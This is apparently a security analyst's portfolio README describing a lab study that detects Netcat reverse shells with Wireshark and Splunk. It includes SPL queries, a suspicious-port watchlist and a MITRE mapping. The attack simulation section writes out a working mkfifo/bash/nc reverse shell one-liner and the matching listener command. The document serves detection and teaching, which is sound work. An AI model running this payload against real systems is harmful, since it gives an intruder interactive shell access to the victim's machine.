# Reverse Shell Network Detection Study

> **Detection Engineering | SOC Analysis | Threat Hunting**  
> Detecting reverse shell behavior through packet analysis and SIEM correlation

---

## Project Summary

This project demonstrates end-to-end detection engineering for reverse shell activity — from attack simulation to SIEM alerting. A controlled lab environment was built using Kali Linux as the attacker machine and Ubuntu Linux as the monitored target. Network traffic was captured with Wireshark and tcpdump, then ingested into Splunk Enterprise for behavioral analysis and dashboard visualization.

The project covers the **full detection lifecycle**: threat simulation → packet capture → log ingestion → SPL query development → dashboard creation.

---

## Objectives

- Simulate a real-world reverse shell attack using Netcat
- Capture and analyze raw TCP traffic with Wireshark
- Identify reverse shell indicators at the packet level
- Ingest network logs into Splunk and build detection queries
- Detect long-lived suspicious sessions, unusual ports, and interactive shell behavior
- Build a SIEM dashboard to visualize attacker activity over time

---

## Lab Environment

```
┌─────────────────────┐         Reverse Shell          ┌──────────────────────┐
│   Kali Linux        │ ◄─────────────────────────────  │   Ubuntu Linux       │
│   (Attacker)        │         Port 4444               │   (Target/Victim)    │
│   172.16.243.1      │                                 │   172.16.243.131     │
│   nc -lnvp 4444     │                                 │   mkfifo + bash pipe │
└─────────────────────┘                                 └──────────────────────┘
                                                                  │
                                                         tcpdump / Wireshark
                                                                  │
                                                        ┌─────────────────────┐
                                                        │   Splunk Enterprise  │
                                                        │   (SIEM / Detection) │
                                                        └─────────────────────┘
```

| Component | Tool / OS | Role |
|-----------|-----------|------|
| Attacker | Kali Linux | Netcat listener, reverse shell control |
| Target | Ubuntu Linux | Victim machine, traffic source |
| Capture | Wireshark / tcpdump | Packet analysis |
| SIEM | Splunk Enterprise 10.2.3 | Log ingestion, detection, dashboards |

---

## Attack Simulation

### Step 1 — Attacker sets up listener (Kali)
```bash
nc -lnvp 4444
```

### Step 2 — Victim executes reverse shell payload (Ubuntu)
```bash
rm -f /tmp/f
mkfifo /tmp/f
cat /tmp/f | /bin/bash -i 2>&1 | nc 172.16.243.1 4444 > /tmp/f
```

This creates a named pipe and redirects bash I/O through Netcat, establishing a persistent interactive shell back to the attacker.

### Step 3 — Attacker gains shell access
Once connected, the attacker ran:
```bash
whoami     # → learner
ls         # → listed home directory contents
pwd        # → /home/learner
ps aux     # → full process list
```

All commands and responses were transmitted in **plaintext TCP** — fully visible in packet captures.

---

## Packet-Level Analysis (Wireshark)

### TCP Three-Way Handshake
The connection to port 4444 was captured with a standard SYN → SYN/ACK → ACK sequence, confirming successful session establishment between `172.16.243.131` (target) and `172.16.243.1` (attacker).

### Long-Lived Persistent Session
The TCP session on port 4444 persisted for **~778 seconds** — far beyond what any legitimate short-lived service connection would maintain. Wireshark confirmed continuous PSH/ACK packet exchanges throughout the session duration.

### Command Visibility in TCP Stream
Following TCP Stream 7 revealed the full interactive shell session in plaintext ASCII — including all commands typed by the attacker and all responses from the victim system. The `whoami` response confirmed the compromised user identity as `learner`.

### Payload Data in Hex Pane
The `whoami` command was also visible at the byte level in the Wireshark hex pane (`77 68 6f 61 6d 69 = whoami`), demonstrating how unencrypted reverse shells expose full command content to network monitoring.

### Connection Termination
The session ended with a clean FIN/ACK sequence, confirming the attacker deliberately closed the connection after completing their activity.

---

## Evidence Files

| File | Description |
|------|-------------|
| `reverse_shell_1.log` | tcpdump log of reverse shell traffic |
| `phase2.pcapng` | Full Wireshark packet capture |

---

## Splunk Detection

### Log Ingestion
Network logs were ingested into Splunk using the sourcetype pattern `*reverse_shell*.log`, containing full TCP connection metadata parsed by regex from tcpdump format.

### Detection Queries

#### Long-Lived Connection Detection
```spl
source="*reverse_shell*.log"
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
| stats min(_time) as start max(_time) as end count by src_ip dest_ip dest_port
| eval duration = end - start
| where duration > 30 OR count > 50
| sort -duration
```

#### Suspicious Port Activity
```spl
source="*reverse_shell*.log"
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
| where dest_port IN ("4444", "1337", "9001", "5555", "6666")
| stats count by src_ip dest_ip dest_port
| sort -count
```

#### Top Destination Ports
```spl
source="*reverse_shell*.log"
| rex "IP (?<src_ip>\d+\.\d+\.\d+\.\d+)\.\d+ > (?<dest_ip>\d+\.\d+\.\d+\.\d+)\.(?<dest_port>\d+)"
| stats count by dest_port
| sort -count
```

### Key Finding
The Splunk long-lived connections table confirmed the reverse shell session:

| src_ip | dest_ip | dest_port | duration (s) |
|--------|---------|-----------|--------------|
| 172.16.243.131 | 172.16.243.1 | 4444 | **778.836** |

A session of 778 seconds on port 4444 — a known Netcat/Metasploit default — is a high-confidence reverse shell indicator.

---

## Dashboard

The Splunk dashboard "Reverse Shell Network Detection Study" was built with three panels:

- **Reverse Shell Activity Over Time** — timeline chart showing traffic spike at the moment of shell establishment (~7:10 PM)
- **Top Destination Ports** — bar chart of all destination ports ranked by packet count
- **Long-Lived Connections** — table of sessions exceeding duration thresholds, with port 4444 prominently flagged

---

## MITRE ATT&CK Mapping

| Technique | ID | Description |
|-----------|----|-------------|
| Command and Scripting Interpreter: Unix Shell | T1059.004 | Bash used as interactive shell via reverse connection |
| Non-Standard Port | T1571 | Port 4444 used instead of standard service ports |
| Exfiltration Over C2 Channel | T1041 | Commands and output transmitted over reverse shell channel |
| Ingress Tool Transfer | T1105 | Netcat used to establish remote access |
| Remote Access Software | T1219 | Netcat acting as lightweight remote administration tool |

---

## Detection Recommendations

| Detection | Threshold | Priority |
|-----------|-----------|----------|
| Outbound connection to port 4444 | Any occurrence | High |
| TCP session duration > 300 seconds to non-standard port | > 300s | High |
| Interactive shell commands visible in packet payload | Any occurrence | Critical |
| Internal host initiating outbound connection to internal attacker | Any occurrence | High |
| `mkfifo` + `nc` command sequence on host logs | Any occurrence | Critical |

---

## Screenshots

| Screenshot | Description |
|------------|-------------|
| `kali_netcat_listener_shell_received.png` | Kali terminal — netcat listener receiving shell from 172.16.243.131:44580 |
| `ubuntu_reverse_shell_payload_command.png` | Ubuntu terminal — mkfifo + bash pipe payload execution |
| `wireshark_tcp_three_way_handshake.png` | Wireshark — SYN/ACK handshake to port 4444 |
| `wireshark_initial_capture_syn_port4444.png` | Wireshark — initial capture with SYN to port 4444 (packet 30) |
| `wireshark_reverse_shell_connection_overview.png` | Wireshark — full connection overview with FIN/ACK and SSDP noise |
| `wireshark_port4444_connection_close.png` | Wireshark — port 4444 session FIN/ACK teardown detail |
| `wireshark_long_lived_connection_frame_analysis.png` | Wireshark — frame-level analysis of persistent session |
| `wireshark_connection_termination_fin_ack.png` | Wireshark — final FIN/ACK termination sequence |
| `wireshark_tcp_stream_reverse_shell_commands.png` | Wireshark Follow TCP Stream — full shell session in plaintext |
| `wireshark_whoami_command_detected.png` | Wireshark — whoami visible in TCP payload hex pane |
| `splunk_dashboard_reverse_shell_activity_overview.png` | Splunk — full dashboard with activity timeline spike |
| `splunk_longlivedconnections_table_port4444.png` | Splunk — long-lived connections table showing 778s session on port 4444 |

---

## Key Takeaways

- Reverse shells using Netcat transmit **all data in plaintext**, making them highly detectable via packet inspection
- **Session duration** is one of the strongest behavioral indicators — legitimate traffic rarely sustains 10+ minute TCP sessions on non-standard ports
- Combining **Wireshark packet analysis** with **Splunk behavioral correlation** provides layered detection capability
- Port 4444 is a well-known indicator and should be on every SOC watchlist

---

## Author

**Mouad Benhizia**  
SOC Analyst   
[GitHub: @Mouadbhz](https://github.com/Mouadbhz)

---

*Built for educational and portfolio purposes. All activity was performed in a controlled lab environment.*
